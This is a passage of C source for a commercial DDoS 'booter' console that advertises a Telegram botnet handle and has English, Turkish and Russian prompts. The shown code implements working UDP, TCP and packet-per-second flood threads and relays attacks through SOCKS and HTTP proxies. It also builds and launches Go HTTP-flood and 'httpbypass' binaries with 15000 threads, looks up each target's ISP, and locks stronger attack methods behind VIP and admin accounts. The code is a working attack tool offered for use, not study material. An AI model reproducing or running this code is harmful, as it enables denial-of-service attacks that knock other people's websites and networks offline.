        "⠀⠀⠀⠀⠀⢠⢏⠨⢢⢫⣷⡻⢆⠀⠀⠀⠀", "⠀⠀⠀⠀⣰⣯⢖⠆⠁⠀⣸⡈⠉⠀⠀⠀⠀", "⠀⠀⠀⠀⡾⣇⡔⡳⠀⢠⢻⢳⣄⡀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⣿⡇⣯⣶⢄⠀⢢⡻⣦⡀⠀⠀", "⠀⠀⠀⠀⠀⠘⢿⠼⢸⣋⠀⠀⡍⠻⣿⣦⠀", "⠀⠀⠀⠀⠀⠀⠆⡇⢸⡠⣐⠥⡝⠶⠛⢿⠧",
        "⠀⠀⠀⠀⢀⣠⣼⣧⣼⣷⣁⣒⣡⡴⠀⢸⡆", "⠀⠀⠀⣪⠿⠗⠂⠀⠔⠊⠉⠉⠉⠉⢉⢢⠇", "⠀⣠⠮⡷⠶⠿⠿⠭⠤⠤⣕⣲⣶⣶⠾⠋⠀", "⠊"
    };
    int satir_sayisi = sizeof(satirlar) / sizeof(satirlar[0]);
    tema_t *t = &temalar[aktif_tema];
    for (int i = 0; i < satir_sayisi; i++) {
        float oran = (satir_sayisi > 1) ? ((float)i / (satir_sayisi - 1)) : 1.0f;
        int r = gamma_gecis(t->r1, t->r2, oran), g = gamma_gecis(t->g1, t->g2, oran), b = gamma_gecis(t->b1, t->b2, oran);
        printf("\033[38;2;%d;%d;%dm%s\033[0m\n", r, g, b, satirlar[i]);
    }
    printf("\n   "); gradient_yazi("telegram: @slientbotnet"); printf("\n   ");
    gradient_yazi(TR("Type \"help\" for commands.", "Komutlar icin \"help\" yazin.", "Введите \"help\" для списка команд."));
    printf("\n\n");
}

// ==================== YARDIMCI ====================
XorShift64 *rng_new(void) {
    XorShift64 *rng = malloc(sizeof(XorShift64)); if (!rng) return NULL;
    struct timeval tv; gettimeofday(&tv, NULL);
    rng->s = (uint64_t)tv.tv_sec * 1000000ULL + tv.tv_usec + (uint64_t)getpid();
    if (rng->s == 0) rng->s = 0x9E3779B97F4A7C15ULL; return rng;
}
uint64_t rng_next(XorShift64 *rng) { uint64_t x = rng->s; x ^= x << 13; x ^= x >> 7; x ^= x << 17; rng->s = x; return x; }
void rng_fill(XorShift64 *rng, uint8_t *buf, size_t len) { size_t i = 0; while (i < len) { uint64_t v = rng_next(rng); for (int j = 0; j < 8 && i < len; j++) { buf[i++] = (uint8_t)(v & 0xFF); v >>= 8; } } }
void sleep_ms(int ms) { struct timespec ts; ts.tv_sec = ms / 1000; ts.tv_nsec = (ms % 1000) * 1000000L; nanosleep(&ts, NULL); }

int resolve_target(target_t *t, const char *target) {
    struct addrinfo hints, *res; memset(&hints, 0, sizeof(hints)); hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(target, NULL, &hints, &res) != 0) { struct in_addr addr; if (inet_pton(AF_INET, target, &addr) == 1) { strncpy(t->ip, target, sizeof(t->ip) - 1); return 0; } return -1; }
    struct sockaddr_in *sin = (struct sockaddr_in *)res->ai_addr; inet_ntop(AF_INET, &sin->sin_addr, t->ip, sizeof(t->ip)); freeaddrinfo(res); return 0;
}

// ==================== OTOMATİK DERLEME ====================
int dosya_var_mi(const char *yol) { return access(yol, F_OK) == 0; }

void http_derle(void) {
    if (!dosya_var_mi("./http") && dosya_var_mi("./http.go")) {
        printf("\033[1;31m[*] %s\033[0m\n", TR("Compiling http.go...", "http.go derleniyor...", "Компиляция http.go..."));
        if (system("go build -buildmode=pie -o http http.go > /dev/null 2>&1") == 0) { system("chmod +x http"); printf("\033[1;31m[+] %s\033[0m\n", TR("http compiled.", "http derlendi.", "http скомпилирован.")); }
    }
    if (!dosya_var_mi("./httpbypass") && dosya_var_mi("./httpbypass.go")) {
        printf("\033[1;31m[*] %s\033[0m\n", TR("Compiling httpbypass.go...", "httpbypass.go derleniyor...", "Компиляция httpbypass.go..."));
        if (system("go build -buildmode=pie -o httpbypass httpbypass.go > /dev/null 2>&1") == 0) { system("chmod +x httpbypass"); printf("\033[1;31m[+] %s\033[0m\n", TR("httpbypass compiled.", "httpbypass derlendi.", "httpbypass скомпилирован.")); }
    }
    sleep(1);
}

// ==================== SOCKS5 / SOCKS4 / HTTP PROXY ====================
int socks5_connect(const char *proxy_ip, int proxy_port, const char *hedef_ip, int hedef_port, const char *kullanici, const char *sifre) {
    int fd = socket(AF_INET, SOCK_STREAM, 0); if (fd < 0) return -1;
    struct sockaddr_in proxy_addr; memset(&proxy_addr, 0, sizeof(proxy_addr)); proxy_addr.sin_family = AF_INET; proxy_addr.sin_port = htons(proxy_port);
    if (inet_pton(AF_INET, proxy_ip, &proxy_addr.sin_addr) != 1) { close(fd); return -1; }
    struct timeval tv = {5, 0}; setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)); setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(fd, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) { close(fd); return -1; }
    int auth_var = (kullanici && sifre && kullanici[0] && sifre[0]);
    uint8_t selam[4]; int selam_uzunluk;
    if (auth_var) { selam[0]=0x05; selam[1]=0x02; selam[2]=0x00; selam[3]=0x02; selam_uzunluk=4; }
    else { selam[0]=0x05; selam[1]=0x01; selam[2]=0x00; selam_uzunluk=3; }
    if (send(fd, selam, selam_uzunluk, 0) != selam_uzunluk) { close(fd); return -1; }
    uint8_t yanit[2]; if (recv(fd, yanit, 2, 0) != 2 || yanit[0] != 0x05) { close(fd); return -1; }
    if (yanit[1] == 0x02) {
        if (!auth_var) { close(fd); return -1; }
        size_t ku = strlen(kullanici), ss = strlen(sifre);
        if (ku > 255) ku = 255; if (ss > 255) ss = 255;
        uint8_t auth[513]; auth[0]=0x01; auth[1]=(uint8_t)ku; memcpy(&auth[2], kullanici, ku); auth[2+ku]=(uint8_t)ss; memcpy(&auth[3+ku], sifre, ss);
        int auth_uzunluk = 3 + ku + ss;
        if (send(fd, auth, auth_uzunluk, 0) != auth_uzunluk) { close(fd); return -1; }
        uint8_t auth_yanit[2]; if (recv(fd, auth_yanit, 2, 0) != 2 || auth_yanit[1] != 0x00) { close(fd); return -1; }
    } else if (yanit[1] != 0x00) { close(fd); return -1; }
    uint8_t istek[10]; istek[0]=0x05; istek[1]=0x01; istek[2]=0x00; istek[3]=0x01;
    struct in_addr hedef_addr; if (inet_pton(AF_INET, hedef_ip, &hedef_addr) != 1) { close(fd); return -1; }
    memcpy(&istek[4], &hedef_addr.s_addr, 4); istek[8] = (hedef_port >> 8) & 0xFF; istek[9] = hedef_port & 0xFF;
    if (send(fd, istek, 10, 0) != 10) { close(fd); return -1; }
    uint8_t cevap[10]; if (recv(fd, cevap, 10, 0) < 10 || cevap[1] != 0x00) { close(fd); return -1; }
    return fd;
}

int socks4_connect(const char *proxy_ip, int proxy_port, const char *hedef_ip, int hedef_port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0); if (fd < 0) return -1;
    struct sockaddr_in proxy_addr; memset(&proxy_addr, 0, sizeof(proxy_addr)); proxy_addr.sin_family = AF_INET; proxy_addr.sin_port = htons(proxy_port);
    if (inet_pton(AF_INET, proxy_ip, &proxy_addr.sin_addr) != 1) { close(fd); return -1; }
    struct timeval tv = {5, 0}; setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)); setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(fd, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) { close(fd); return -1; }
    uint8_t istek[9]; istek[0]=0x04; istek[1]=0x01; istek[2]=(hedef_port>>8)&0xFF; istek[3]=hedef_port&0xFF;
    struct in_addr hedef_addr; if (inet_pton(AF_INET, hedef_ip, &hedef_addr) != 1) { close(fd); return -1; }
    memcpy(&istek[4], &hedef_addr.s_addr, 4); istek[8]=0x00;
    if (send(fd, istek, 9, 0) != 9) { close(fd); return -1; }
    uint8_t cevap[8]; if (recv(fd, cevap, 8, 0) != 8 || cevap[1] != 0x5A) { close(fd); return -1; }
    return fd;
}

int http_connect(const char *proxy_ip, int proxy_port, const char *hedef_ip, int hedef_port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0); if (fd < 0) return -1;
    struct sockaddr_in proxy_addr; memset(&proxy_addr, 0, sizeof(proxy_addr)); proxy_addr.sin_family = AF_INET; proxy_addr.sin_port = htons(proxy_port);
    if (inet_pton(AF_INET, proxy_ip, &proxy_addr.sin_addr) != 1) { close(fd); return -1; }
    struct timeval tv = {5, 0}; setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)); setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(fd, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) { close(fd); return -1; }
    char istek[256]; snprintf(istek, sizeof(istek), "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n", hedef_ip, hedef_port, hedef_ip, hedef_port);
    if (send(fd, istek, strlen(istek), 0) <= 0) { close(fd); return -1; }
    char cevap[256] = {0}; int n = recv(fd, cevap, sizeof(cevap) - 1, 0);
    if (n <= 0 || strstr(cevap, "200") == NULL) { close(fd); return -1; }
    return fd;
}

int proxy_connect(proxy_t *p, const char *hedef_ip, int hedef_port) {
    if (p->tur == 2) return socks5_connect(p->ip, p->port, hedef_ip, hedef_port, NULL, NULL);
    else if (p->tur == 1) return socks4_connect(p->ip, p->port, hedef_ip, hedef_port);
    else return http_connect(p->ip, p->port, hedef_ip, hedef_port);
}

// ==================== IP API ====================
size_t curl_yaz_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t toplam = size * nmemb; char *buf = (char *)userdata; size_t mevcut = strlen(buf); size_t kalan = 4095 - mevcut;
    if (toplam > kalan) toplam = kalan; strncat(buf, (char *)ptr, toplam); return size * nmemb;
}

void ip_api_sorgula(const char *ip, char *isp, char *asn, char *ulke) {
    strcpy(isp, "Unknown"); strcpy(asn, "Unknown"); strcpy(ulke, "Unknown");
    CURL *curl = curl_easy_init(); if (!curl) return;
    char url[256]; struct in_addr test_addr;
    if (inet_pton(AF_INET, ip, &test_addr) == 1) { snprintf(url, sizeof(url), "http://ip-api.com/json/%s?fields=status,country,isp,as", ip); }
    else { target_t t; if (resolve_target(&t, ip) == 0) snprintf(url, sizeof(url), "http://ip-api.com/json/%s?fields=status,country,isp,as", t.ip); else { curl_easy_cleanup(curl); return; } }
    char yanit[4096] = {0}; curl_easy_setopt(curl, CURLOPT_URL, url); curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L); curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_yaz_callback); curl_easy_setopt(curl, CURLOPT_WRITEDATA, yanit);
    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) { struct json_object *parsed = json_tokener_parse(yanit); if (parsed) { struct json_object *status_obj, *isp_obj, *as_obj, *country_obj; if (json_object_object_get_ex(parsed, "status", &status_obj)) { if (strcmp(json_object_get_string(status_obj), "success") == 0) { if (json_object_object_get_ex(parsed, "isp", &isp_obj)) strncpy(isp, json_object_get_string(isp_obj), 127); if (json_object_object_get_ex(parsed, "as", &as_obj)) strncpy(asn, json_object_get_string(as_obj), 127); if (json_object_object_get_ex(parsed, "country", &country_obj)) strncpy(ulke, json_object_get_string(country_obj), 127); } } json_object_put(parsed); } }
    curl_easy_cleanup(curl);
}

// ==================== ATTACK WORKERS ====================
void *tcp_worker(void *arg) {
    target_t *t = arg; XorShift64 *rng = rng_new(); uint8_t payload[1400]; rng_fill(rng, payload, 1400); time_t end = time(NULL) + t->sec;
    while (time(NULL) < end && running && saldiri_aktif) {
        int fd;
        if (proxy_sayisi > 0) { int idx = (int)(rng_next(rng) % proxy_sayisi); fd = proxy_connect(&proxyler[idx], t->ip, t->port); }
        else { fd = socket(AF_INET, SOCK_STREAM, 0); if (fd >= 0) { struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(t->port); inet_pton(AF_INET, t->ip, &addr.sin_addr); struct timeval tv = {5, 0}; setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)); if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(fd); sleep_ms(10); continue; } } }
        if (fd < 0) { sleep_ms(10); continue; }
        int bursts = 50 + (int)(rng_next(rng) % 200); for (int j = 0; j < bursts; j++) { if (write(fd, payload, 1400) <= 0) break; }
        struct linger l = {1, 0}; setsockopt(fd, SOL_SOCKET, SO_LINGER, &l, sizeof(l)); close(fd);
    }
    free(rng); return NULL;
}

void *udp_worker(void *arg) {
    target_t *t = arg; XorShift64 *rng = rng_new(); struct sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_port = htons(t->port); inet_pton(AF_INET, t->ip, &sin.sin_addr);
    int fd = socket(AF_INET, SOCK_DGRAM, 0); if (fd < 0) { free(rng); return NULL; }
    char databuf[1400]; rng_fill(rng, (uint8_t*)databuf, 1400); time_t end = time(NULL) + t->sec; time_t son_kontrol = time(NULL);
    while (running && saldiri_aktif) { time_t simdi = time(NULL); if (simdi - son_kontrol >= 1) { if (simdi >= end) break; son_kontrol = simdi; } sendto(fd, databuf, 1400, 0, (struct sockaddr*)&sin, sizeof(sin)); }
    close(fd); free(rng); return NULL;
}

void *pps_worker(void *arg) {
    target_t *t = arg; struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(t->port); inet_pton(AF_INET, t->ip, &addr.sin_addr);
    int fd = socket(AF_INET, SOCK_DGRAM, 0); if (fd < 0) return NULL;
    XorShift64 *rng = rng_new(); uint8_t buf[48]; rng_fill(rng, buf, 48); time_t end = time(NULL) + t->sec; time_t son_kontrol = time(NULL);
    while (running && saldiri_aktif) { time_t simdi = time(NULL); if (simdi - son_kontrol >= 1) { if (simdi >= end) break; son_kontrol = simdi; } sendto(fd, buf, 48, 0, (struct sockaddr*)&addr, sizeof(addr)); }
    close(fd); free(rng); return NULL;
}

// ==================== ATTACK EKRANI ====================
void attack_ekrani(const char *mod, const char *hedef, int port, int sure, int thread, const char *isp_hedef) {
    system("clear"); banner_yazdir(); char buf[64]; time_t simdi = time(NULL);
    gradient_satir(TR("Status:", "Durum:", "Статус:"), TR("Attack Launched", "Saldiri Baslatildi", "Атака запущена"));
    gradient_satir(TR("Target:", "Hedef:", "Цель:"), hedef);
    snprintf(buf, sizeof(buf), "%d", port); gradient_satir(TR("Port:", "Port:", "Порт:"), buf);
    snprintf(buf, sizeof(buf), "%d", sure); gradient_satir(TR("Duration:", "Sure:", "Длительность:"), buf);
    snprintf(buf, sizeof(buf), "%s", mod); gradient_satir(TR("Method:", "Yontem:", "Метод:"), buf);
    snprintf(buf, sizeof(buf), "%d", thread); gradient_satir(TR("Threads:", "Threads:", "Потоки:"), buf);
    snprintf(buf, sizeof(buf), "%ld", (long)simdi); gradient_satir(TR("Sent Time:", "Gonderim Zamani:", "Время отправки:"), buf);
    printf("\n"); gradient_yazi(TR("Target Details:", "Hedef Detaylari:", "Детали цели:")); printf("\n\n");
    char isp[128], asn[128], ulke[128]; ip_api_sorgula(isp_hedef, isp, asn, ulke);
    gradient_satir(TR("ISP:", "ISS:", "Провайдер:"), isp); gradient_satir("ASN:", asn); gradient_satir(TR("Country:", "Ulke:", "Страна:"), ulke);
    printf("\n"); gradient_yazi(TR("[*] Attack in progress... Type 'attackstop' to stop.", "[*] Saldiri suruyor... Durdurmak icin 'attackstop' yazin.", "[*] Атака продолжается... Введите 'attackstop' для остановки.")); printf("\n\n");
}

// ==================== SALDIRI THREAD ====================
char g_mod[16] = {0}; char g_hedef[128] = {0}; int g_port = 0; int g_sure = 0;

void *saldiri_thread_fn(void *arg) {
    (void)arg; target_t t; if (resolve_target(&t, g_hedef) < 0) { saldiri_aktif = 0; return NULL; } t.port = g_port; t.sec = g_sure;
    int n = g_thread_count; pthread_t *threads = malloc(sizeof(pthread_t) * n);
    if (strcmp(g_mod, "udp") == 0) { for (int i = 0; i < n; i++) pthread_create(&threads[i], NULL, udp_worker, &t); }
    else if (strcmp(g_mod, "pps") == 0) { for (int i = 0; i < n; i++) pthread_create(&threads[i], NULL, pps_worker, &t); }
    else { for (int i = 0; i < n; i++) pthread_create(&threads[i], NULL, tcp_worker, &t); }
    for (int i = 0; i < n; i++) pthread_join(threads[i], NULL); free(threads); saldiri_aktif = 0; return NULL;
}

// ==================== SİNYAL ====================
void sinyal_yakala(int sig) { (void)sig; saldiri_aktif = 0; running = 0; }

// ==================== HELP ====================
void help_yazdir(void) {
    struct winsize w; ioctl(STDOUT_FILENO, TIOCGWINSZ, &w); int genislik = (w.ws_col > 0) ? w.ws_col : 80; int bosluk = (genislik - 9) / 2; if (bosluk < 0) bosluk = 0; for (int i = 0; i < bosluk; i++) printf(" ");
    gradient_yazi(TR("Help Menu", "Yardim Menusu", "Меню помощи")); printf("\n\n");

    gradient_yazi(TR("[ATTACK COMMANDS]", "[SALDIRI KOMUTLARI]", "[КОМАНДЫ АТАКИ]")); printf("\n");
    gradient_yazi("  "); printf(BEYAZ "udp" SIFIRLA " <target> <port> <time>   - UDP flood\n");
    gradient_yazi("  "); printf(BEYAZ "tcp" SIFIRLA " <target> <port> <time>   - TCP flood\n");
    gradient_yazi("  "); printf(BEYAZ "pps" SIFIRLA " <target> <port> <time>   - PPS flood\n");
    gradient_yazi("  "); printf(BEYAZ "http" SIFIRLA " <url> <time> <G|P>     - HTTP flood\n");
    gradient_yazi("  "); printf(BEYAZ "httpbypass" SIFIRLA " <url> <time>       - HTTP Bypass\n");
    gradient_yazi("  "); printf(BEYAZ "attackstop" SIFIRLA "                  - %s\n", TR("stop attack", "saldiriyi durdur", "остановить атаку")); printf("\n");

    if (strcmp(aktif_kullanici_rol, "admin") == 0) {
        gradient_yazi(TR("[ADMIN COMMANDS]", "[ADMIN KOMUTLARI]", "[АДМИН КОМАНДЫ]")); printf("\n");
        gradient_yazi("  "); printf(BEYAZ "adduser" SIFIRLA " <user> <pass> <role> <YYYY-MM-DD>\n");
        gradient_yazi("  "); printf(BEYAZ "userlist" SIFIRLA "                        - %s\n", TR("List all users", "Kullanicilari listele", "Список пользователей"));
        gradient_yazi("  "); printf(BEYAZ "disable" SIFIRLA " <user>                 - %s\n", TR("Disable user", "Hesabi kapat", "Отключить пользователя"));
        gradient_yazi("  "); printf(BEYAZ "enable" SIFIRLA " <user>                  - %s\n", TR("Enable user", "Hesabi ac", "Включить пользователя"));
        gradient_yazi("  "); printf(BEYAZ "setrole" SIFIRLA " <user> <vip|free>      - %s\n", TR("Set user role", "Kullanici yetkisi ver", "Установить роль")); printf("\n");
    }

    gradient_yazi(TR("[UTILITY COMMANDS]", "[ARAC KOMUTLARI]", "[УТИЛИТЫ]")); printf("\n");
    gradient_yazi("  "); printf(BEYAZ "myplan" SIFIRLA "                       - %s\n", TR("Show account info", "Hesap bilgilerini goster", "Информация об аккаунте"));
    gradient_yazi("  "); printf(BEYAZ "info" SIFIRLA " <ip/domain>           - %s\n", TR("Target info lookup", "Hedef bilgisi sorgula", "Информация о цели")); printf("\n");

    gradient_yazi(TR("[THEME COMMANDS]", "[TEMA KOMUTLARI]", "[КОМАНДЫ ТЕМ]")); printf("\n");
    gradient_yazi("  "); printf(BEYAZ "theme" SIFIRLA " <1-%d>              - %s\n", tema_sayisi, TR("change color theme", "renk temasini degistir", "сменить тему"));
    gradient_yazi("  "); printf(BEYAZ "themelist" SIFIRLA "                    - %s\n", TR("theme list", "tema listesi", "список тем")); printf("\n");

    gradient_yazi(TR("[SYSTEM COMMANDS]", "[SISTEM KOMUTLARI]", "[СИСТЕМНЫЕ КОМАНДЫ]")); printf("\n");
    gradient_yazi("  "); printf(BEYAZ "lang" SIFIRLA " <en|tr|ru>            - %s\n", TR("Change language", "Dili degistir", "Сменить язык"));
    gradient_yazi("  "); printf(BEYAZ "help" SIFIRLA " / " BEYAZ "?" SIFIRLA "   - %s\n", TR("this guide", "bu kilavuz", "это руководство"));
    gradient_yazi("  "); printf(BEYAZ "clear" SIFIRLA "       - %s\n", TR("clear screen", "ekrani temizle", "очистить экран"));
    gradient_yazi("  "); printf(BEYAZ "exit" SIFIRLA "        - %s\n\n", TR("exit", "cikis", "выход"));
}

void tema_listesi_yazdir(void) {
    gradient_yazi(TR("Theme List:", "Tema Listesi:", "Список тем:")); printf("\n\n");
    for (int i = 0; i < tema_sayisi; i++) {
        if (i == aktif_tema) printf("  " BEYAZ ">" SIFIRLA " "); else printf("    ");
        printf("%2d. %s\n", i + 1, temalar[i].isim);
    }
    printf("\n");
}

// ==================== MAIN ====================
// ==================== MAIN ====================
int main(void) {
    while (!giris_yapildi && running) { if (!giris_yap()) sleep(2); }
    if (!giris_yapildi) return 0;

    system("clear"); banner_yazdir();
    http_derle();
    signal(SIGINT, sinyal_yakala); signal(SIGTERM, sinyal_yakala);
    curl_global_init(CURL_GLOBAL_DEFAULT);

    char satir[256]; int ilk_prompt = 1;

    while (running) {
        if (ilk_prompt) { prompt_yazdir(); ilk_prompt = 0; }

        fd_set fds; FD_ZERO(&fds); FD_SET(STDIN_FILENO, &fds); struct timeval tv = {1, 0};
        int hazir = select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv);

        if (hazir > 0 && FD_ISSET(STDIN_FILENO, &fds)) {
            if (!fgets(satir, sizeof(satir), stdin)) break;
            satir[strcspn(satir, "\n")] = 0;
            if (strlen(satir) == 0) { prompt_yazdir(); continue; }

            char komut[16] = {0}; char hedef[128] = {0}; int port = 0; int sure = 0;
            int alan = sscanf(satir, "%15s %127s %d %d", komut, hedef, &port, &sure);

            // Yetki Kontrolu (is_vip = 1 ise VIP veya ADMIN)
            int is_vip = (strcmp(aktif_kullanici_rol, "vip") == 0 || strcmp(aktif_kullanici_rol, "admin") == 0);

            if (strcmp(komut, "exit") == 0 || strcmp(komut, "quit") == 0) { saldiri_aktif = 0; printf("[*] %s\n", TR("Exiting", "Cikis yapiliyor", "Выход")); break; }
            if (strcmp(komut, "clear") == 0 || strcmp(komut, "cls") == 0) { system("clear"); banner_yazdir(); prompt_yazdir(); continue; }
            if (strcmp(komut, "help") == 0 || strcmp(komut, "?") == 0) { help_yazdir(); prompt_yazdir(); continue; }
            
            if (strcmp(komut, "lang") == 0) {
                if (strcmp(hedef, "en") == 0) current_lang = 0; else if (strcmp(hedef, "tr") == 0) current_lang = 1; else if (strcmp(hedef, "ru") == 0) current_lang = 2;
                system("clear"); banner_yazdir(); prompt_yazdir(); continue;
            }
            if (strcmp(komut, "theme") == 0) { if (alan >= 2) { tema_ayarla(atoi(hedef)); system("clear"); banner_yazdir(); } else tema_listesi_yazdir(); prompt_yazdir(); continue; }
            if (strcmp(komut, "themelist") == 0) { tema_listesi_yazdir(); prompt_yazdir(); continue; }
            
            if (strcmp(komut, "myplan") == 0) { plan_goster(aktif_kullanici); prompt_yazdir(); continue; }
            
            if (strcmp(komut, "info") == 0) {
                if (alan >= 2) {
                    char isp[128], asn[128], ulke[128];
                    ip_api_sorgula(hedef, isp, asn, ulke);
                    system("clear"); banner_yazdir(); printf("\n");
                    gradient_satir(TR("Target:", "Hedef:", "Цель:"), hedef); gradient_satir("ISP:", isp); gradient_satir("ASN:", asn); gradient_satir("Country:", ulke); printf("\n");
                } else printf("[-] Usage: info <ip/domain>\n");
                prompt_yazdir(); continue;
            }

            // ADMIN COMMANDS
            if (strcmp(komut, "adduser") == 0) {
                if (strcmp(aktif_kullanici_rol, "admin") != 0) { printf("[-] Admin only!\n"); prompt_yazdir(); continue; }
                char u[64], p[64], r[16], b[32];
                if (sscanf(satir, "%*s %63s %63s %15s %31s", u, p, r, b) == 4) hesap_ekle(u, p, r, b);
                else printf("[-] Usage: adduser <user> <pass> <vip|free> <YYYY-MM-DD>\n");
                prompt_yazdir(); continue;
            }
            if (strcmp(komut, "userlist") == 0) {
                if (strcmp(aktif_kullanici_rol, "admin") != 0) { printf("[-] Admin only!\n"); prompt_yazdir(); continue; }
                kullanicilari_listele(); prompt_yazdir(); continue;
            }
            if (strcmp(komut, "disable") == 0 || strcmp(komut, "enable") == 0) {
                if (strcmp(aktif_kullanici_rol, "admin") != 0) { printf("[-] Admin only!\n"); prompt_yazdir(); continue; }
                if (alan >= 2) hesap_durum_degistir(hedef, strcmp(komut, "enable") == 0);
                else printf("[-] Usage: disable/enable <user>\n");
                prompt_yazdir(); continue;
            }
            if (strcmp(komut, "setrole") == 0) {
                if (strcmp(aktif_kullanici_rol, "admin") != 0) { printf("[-] Admin only!\n"); prompt_yazdir(); continue; }
                char u[64], r[16];
                if (sscanf(satir, "%*s %63s %15s", u, r) == 2) hesap_rol_degistir(u, r);
                else printf("[-] Usage: setrole <user> <vip|free>\n");
                prompt_yazdir(); continue;
            }

            if (strcmp(komut, "attackstop") == 0) {
                if (saldiri_aktif) {
                    saldiri_aktif = 0; printf("\033[1;31m[*] %s\033[0m\n", TR("Stopping attack...", "Saldiri durduruluyor...", "Остановка атаки..."));
                    system("pkill -f './httpbypass' 2>/dev/null"); system("pkill -f './http' 2>/dev/null"); sleep(1);
                    printf("\033[1;31m[+] %s\033[0m\n", TR("Attack stopped.", "Saldiri durduruldu.", "Атака остановлена."));
                } else { printf("[-] %s\n", TR("No active attack", "Aktif saldiri yok", "Нет активной атаки")); }
                prompt_yazdir(); continue;
            }

            // HTTP (VIP ONLY)
            if (strcmp(komut, "http") == 0) {
                if (!is_vip) { printf("\033[1;31m[-] %s\033[0m\n", TR("VIP only! Upgrade your account.", "Sadece VIP! Hesabini yukselt.", "Только для VIP!")); prompt_yazdir(); continue; }
                if (saldiri_aktif) { printf("[-] Bir saldiri zaten calisiyor. Once 'attackstop' kullan.\n"); prompt_yazdir(); continue; }
                char *p = satir + 4; while (*p == ' ') p++;
                char url[256] = {0}; int ui = 0; while (*p && *p != ' ' && ui < 255) url[ui++] = *p++; url[ui] = 0;
                while (*p == ' ') p++; int l7_sure = atoi(p); while (*p && *p != ' ') p++; while (*p == ' ') p++;
                char l7_mod = 'G'; if (*p == 'G' || *p == 'g') l7_mod = 'G'; else if (*p == 'P' || *p == 'p') l7_mod = 'P';
                if (url[0] == 0 || l7_sure <= 0) { printf("[-] Kullanim: http <url> <time> <G|P>\n"); prompt_yazdir(); continue; }
                saldiri_aktif = 1; const char *mod_str = (l7_mod == 'P') ? "post" : "get"; int l7_threads = 15000; int l7_port = 80; if (strncmp(url, "https://", 8) == 0) l7_port = 443;
                char hostname[128] = {0}; char *uptr = url; if (strncmp(uptr, "https://", 8) == 0) uptr += 8; else if (strncmp(uptr, "http://", 7) == 0) uptr += 7; int hi = 0;
                while (*uptr && *uptr != '/' && *uptr != ':' && hi < 127) hostname[hi++] = *uptr++; hostname[hi] = 0;
                attack_ekrani("http", url, l7_port, l7_sure, l7_threads, hostname);
                char l7_cmd[768]; snprintf(l7_cmd, sizeof(l7_cmd), "./http %s %d %s %d nil > /dev/null 2>&1 &", url, l7_threads, mod_str, l7_sure);
                system(l7_cmd); printf("\n"); prompt_yazdir(); continue;
            }

            // HTTPBYPASS (VIP ONLY)
            if (strcmp(komut, "httpbypass") == 0) {
                if (!is_vip) { printf("\033[1;31m[-] %s\033[0m\n", TR("VIP only! Upgrade your account.", "Sadece VIP! Hesabini yukselt.", "Только для VIP!")); prompt_yazdir(); continue; }
                if (saldiri_aktif) { printf("[-] Bir saldiri zaten calisiyor. Once 'attackstop' kullan.\n"); prompt_yazdir(); continue; }
                char *p = satir + 10; while (*p == ' ') p++;
                char url[256] = {0}; int ui = 0; while (*p && *p != ' ' && ui < 255) url[ui++] = *p++; url[ui] = 0;
                while (*p == ' ') p++; int l7_sure = atoi(p);
                if (url[0] == 0 || l7_sure <= 0) { printf("[-] Kullanim: httpbypass <url> <time>\n"); prompt_yazdir(); continue; }
                saldiri_aktif = 1; int l7_threads = 15000; int l7_port = 80; if (strncmp(url, "https://", 8) == 0) l7_port = 443;
                char hostname[128] = {0}; char *uptr = url; if (strncmp(uptr, "https://", 8) == 0) uptr += 8; else if (strncmp(uptr, "http://", 7) == 0) uptr += 7; int hi = 0;
                while (*uptr && *uptr != '/' && *uptr != ':' && hi < 127) hostname[hi++] = *uptr++; hostname[hi] = 0;
                attack_ekrani("httpbypass", url, l7_port, l7_sure, l7_threads, hostname);
                char l7_cmd[768]; snprintf(l7_cmd, sizeof(l7_cmd), "./httpbypass %s %d %d > /dev/null 2>&1 &", url, l7_sure, l7_threads);
                system(l7_cmd); printf("\n"); prompt_yazdir(); continue;
            }

            if (alan < 4) {
                printf("[-] %s: <mode> <target> <port> <time>\n", TR("Usage", "Kullanim", "Использование"));
                prompt_yazdir(); continue;
            }

            // UDP / TCP / PPS
            if (strcmp(komut, "udp") == 0 || strcmp(komut, "tcp") == 0 || strcmp(komut, "pps") == 0) {
                
                // UDP HERKESE ACIK, TCP VE PPS VIP
                if (strcmp(komut, "udp") != 0 && !is_vip) {
                    printf("\033[1;31m[-] %s\033[0m\n", TR("VIP only! Upgrade your account.", "Sadece VIP! Hesabini yukselt.", "Только для VIP!"));
                    prompt_yazdir(); continue;
                }

                if (saldiri_aktif) { printf("[-] Attack already running!\n"); prompt_yazdir(); continue; }
                strncpy(g_mod, komut, sizeof(g_mod) - 1); strncpy(g_hedef, hedef, sizeof(g_hedef) - 1); g_port = port; g_sure = sure;
                saldiri_aktif = 1;
                attack_ekrani(komut, hedef, port, sure, g_thread_count, hedef);
                prompt_yazdir(); pthread_create(&saldiri_thread, NULL, saldiri_thread_fn, NULL); pthread_detach(saldiri_thread);
            } else {
                printf("[-] %s: %s\n", TR("Invalid mode", "Gecersiz mod", "Неверный режим"), komut);
